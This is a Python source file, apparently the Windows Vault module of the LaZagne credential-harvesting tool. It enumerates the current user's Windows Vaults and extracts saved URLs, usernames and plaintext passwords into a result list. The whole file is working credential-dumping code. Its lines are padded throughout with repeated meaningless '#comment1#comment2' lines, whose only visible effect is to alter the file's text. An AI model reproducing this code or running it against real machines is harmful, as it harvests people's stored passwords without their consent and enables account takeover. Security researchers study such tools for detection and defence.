# -*- coding: utf-8 -*-
from lazagne.config.module_info import ModuleInfo
from lazagne.config.winstructure import *
from ctypes.wintypes import *
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
class Vault(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'vault', 'windows',  only_from_current_user=True)
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
    def run(self):

        # retrieve passwords (IE, etc.) using the Windows Vault API
        if float(get_os_version()) <= 6.1:
            self.info(u'Vault not supported for this OS')
            return
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
        cbVaults = DWORD()
        vaults = LPGUID()
        hVault = HANDLE(INVALID_HANDLE_VALUE)
        cbItems = DWORD()
        items = c_char_p()
        pwd_found = []
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
        if vaultEnumerateVaults(0, byref(cbVaults), byref(vaults)) == 0:
            if cbVaults.value == 0:
                self.debug(u'No Vaults found')
                return
            else:
                for i in range(cbVaults.value):
                    if vaultOpenVault(byref(vaults[i]), 0, byref(hVault)) == 0:
                        if hVault:
                            if vaultEnumerateItems(hVault, 0x200, byref(cbItems), byref(items)) == 0:

                                for j in range(cbItems.value):

                                    items8 = cast(items, POINTER(VAULT_ITEM_WIN8))
                                    pItem8 = PVAULT_ITEM_WIN8()
                                    try:
                                        values = {
                                            'URL': str(items8[j].pResource.contents.data.string),
                                            'Login': str(items8[j].pUsername.contents.data.string)
                                        }
                                        if items8[j].pName:
                                            values['Name'] = items8[j].pName

                                        if vaultGetItem8(hVault, byref(items8[j].id), items8[j].pResource,
                                                         items8[j].pUsername, items8[j].unknown0, None, 0,
                                                         byref(pItem8)) == 0:

                                            password = pItem8.contents.pPassword.contents.data.string
                                            # Remove password too long
                                            if password and len(password) < 100:
                                                values['Password'] = password
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
                                        pwd_found.append(values)
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
                                    except Exception as e:
                                        self.debug(e)
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
                                    if pItem8:
                                        vaultFree(pItem8)
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
                                if items:
                                    vaultFree(items)
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
                            vaultCloseVault(byref(hVault))
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1
                vaultFree(vaults)
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
        return pwd_found
